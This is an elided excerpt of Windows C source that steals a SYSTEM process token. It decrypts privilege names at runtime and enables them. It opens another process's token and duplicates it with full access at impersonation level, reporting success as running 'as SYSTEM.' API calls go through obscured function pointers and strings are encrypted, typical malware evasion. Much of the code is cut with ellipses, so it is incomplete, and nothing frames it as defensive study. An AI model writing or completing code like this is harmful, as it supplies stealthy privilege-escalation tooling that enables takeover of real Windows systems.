...
BOOL EnablePrivilege(HANDLE hToken, const unsigned char *encryptedPriv,
                     size_t encLen) {
  TOKEN_PRIVILEGES tp;
  LUID luid;
  ...
  if (!pLPVA(NULL, decW, &luid)) {
    log_error("LookupPrivilegeValue failed for %s. Error: %lu", decW,
              GetLastError());
    custom_free(decW);
    return FALSE;
  }
...
BOOL GetSystemTokenAndDuplicate(HANDLE *hSystemToken) {
  ...
  if (hSnapshot == INVALID_HANDLE_VALUE) {
    log_error("pCTH  error: %u", GetLastError());
    return FALSE;
  }
          ...
          if (pOPTK(hProcess,
            ...
            if (pDUPTOK(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
              ...
              *hSystemToken = hDupToken;
              ...
              log_success("Successfully duplicated token. Process can now run "
                          "as SYSTEM.");
              break;
            }
            CloseHandle(hToken);
